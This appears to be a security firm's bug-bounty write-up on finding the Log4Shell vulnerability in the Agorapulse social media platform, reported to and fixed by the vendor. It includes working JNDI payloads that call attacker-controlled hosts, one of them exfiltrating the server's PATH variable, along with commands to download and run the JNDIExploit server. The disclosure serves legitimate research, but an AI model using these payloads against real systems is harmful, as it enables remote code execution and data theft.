# LOG4J on Agorapulse



Log4j is a logging framework for Java applications. It is a popular choice for developers looking for a simple and flexible logging solution. However, Log4j has been found to be vulnerable to a number of security threats. The log4j library has recently been found to contain a serious vulnerability that went by the moniker of log4shell and gained widespread attention. This vulnerability allows unauthenticated remote code execution on vulnerable servers and may be exploited to expose sensitive information. For example, if an attacker can inject malicious code into a Log4j logging statement, they can execute any arbitrary commands on the vulnerable server.

For more information on Log4j security, see the following resources:

- OWASP Log4j Cheat Sheet
- Log4j Vulnerabilities and Exposures
- Secure Log4j Usage

Log4Shell vulnerability is a critical vulnerability, affecting Apache Log4j 2 versions 2.0 to 2.14.1, as identified by Chen Zhaojun of the Alibaba Cloud Security Team. NIST published a critical CVE in the National Vulnerability Database on December 10th, 2021, naming this as CVE-2021–44228. Apache Software Foundation assigned the maximum CVSS severity rating of 10.

This disclosure came storming into the security industry and a havoc was created because all companies implementing this vulnerable framework were exploitable by this critical vulnerability. One can get an idea from the analytics published by hackerone which say , “Hackers have submitted over 2,000 Log4Shell reports to over 400 of our customers. The majority of reports were made in the first 14 days after the public disclosure of Log4 Shell" . Almost the same number of reports were submitted on bugcrowd as well with over _300 reports_ submitted in a single day.


## What is agorapulse:

Agorapulse basically provides everything an organization  could possibly need for social media marketing and monitoring and management.focusing on social media platforms like facebook,linkedin and twitter,agorapulse provides a comprehensive and a compact platform for companies for their marketing strategies while also keeping it under the budget radar.The software is used to create & schedule social media content, engage audiences, listen for key terms, and analyze social media performance.


## How we found log4js on agorapulse:

It was the middle of winter of 2021 when the news of log4j vulnerability broke out in the cyber security industry. And as the norm goes, it got all the security researchers on their heels. As the clock was ticking our company decided to focus wholly on exploiting this vulnerability.

Our company had many targets to focus on and scan for this vulnerability. So the options were open. One of those available targets was agorapulse. We plunged into research mode and figured out how we were going to scan for this vulnerability, Due to the fact that the vulnerability could be present on any endpoint, any request it was really hard to focus on one part of an application. So decided to scrap payloads all over the web application and wait for any pingbacks, To do that we We identified features and functionalities where we could use our payloads.

As the application was pretty vast with multiple features, we had to stay organized. We used a simple and comprehensive approach of pasting payloads everywhere in the application and as said above to keep things organized we used functionality-specific identifiers in the payloads. 

For example, We used 

If we were using a payload in profile-picture field we would use `${jndi:ldap://profilepic.<Your-Burp-Collab-URL>/a}` and if we were pasting a payload in messege box we used `${jndi:ldap://inbox.<Your-Burp-Collab-URL>/a}` and so on, It easily allowed us to indentify the vulnerable request to trigger the vulnerability.


On the other hand we also played it safe, using a payload that was not at all harmful to the client i,e did not result in any denial of service attack or executing any malicious coommands inside the application. The purpose of the payload was just to give us a pingback so the place of vulnerability could be identified. So we devised the following safe payload to identify the dns pingbacks : `${jndi:ldap://<Your-Burp-Collab-URL>/a}` .

So now the identification process began and after a while we received two pingbacks. One of the received was a false pingback. But next up we had a dns pingback that identified the presence of Log4shell vulnerability.


## Summarizing the Steps

So the steps to reproduce were as follows

- Start Burp and create a new burp collaborator Client
- Now Login to agorapulse and click on `Publish` to publish a new post.

![1.png](https://github.com/Snap-sec/blog/blob/gh-pages/assets/images/agora-log4j/1.png)

- Now use your burp collaborator to make a new payload `${jndi:ldap://<Your-Burp-Collab-URL>/a}`, and paste it in the Post Section.
- Now Select any profile from the left side and Publish the POST

![2.png](https://github.com/Snap-sec/blog/blob/gh-pages/assets/images/agora-log4j/2.png)

- On going back to burp collaborator Client you will see a Pingback on it

![3.png](https://github.com/Snap-sec/blog/blob/gh-pages/assets/images/agora-log4j/Three.png)


  
## Demonstration of Impact ( Remote Code Execution )


As mentioned in earlier sections the successful exploitation could lead to RCE. We refrained from doing any such action which could lead to any kind of disruption in services. So, we decide to prove the impact by extacting the global PATH variable to prove the real impact of the vulnerability and we needed to setup and JNDI server for that, So we quickly setup an amazon ec2 and setup an JNDI server using the following approach.

- SSH to your Server


```
ssh user@<your-ip>
```

- Download and Install JNDI Server

```
wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
```
-Run the Exploit and you should see the following output on screen

```
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <your-ip> -p 8888
```

After the following commands we had our JDNI server running on our `ServerIP:8888`

As we went back to Agorapulse and make a another post with this Payload : `${jndi:ldap://[ServerIp]:1389/${env:PATH}`

  
we were able just able to extract the environment variables of the server.


![4.png](https://github.com/Snap-sec/blog/blob/gh-pages/assets/images/agora-log4j/4.png)
  

We stopped right after extracting the path variables of the vulnerable server just to keep the exploitation ethical. And Hence no sensitive , Confidential or any information related to their users were extracted.


## Response of Agora Team

Submitting the report to the agora team, we got their first response in a day. They were responsive and concerned with the security of their online assets. They fixed the bug in a on the same day and rewarded our finding.

After their fix was implemented we , The team requested an re-check on the vulnerability and we tried various payloads and bypasses to conform if the fix was working well. But we were unable to bypass the fix and it was working fine and we confirmed the fix.

  
  


## About us

Snapsec is a team of security experts specialized in providing pentesting and other security services to secure your online assets. We have a specialized testing methodology that ensures in-depth testing of your business logic and other latest vulnerabilities. 

 If you are looking for a team that values your security and ensures that you are fully secure against online security threats, feel free to get in touch with us #[support@snapsec.co](mailto:support@snapsec.co)
 
 
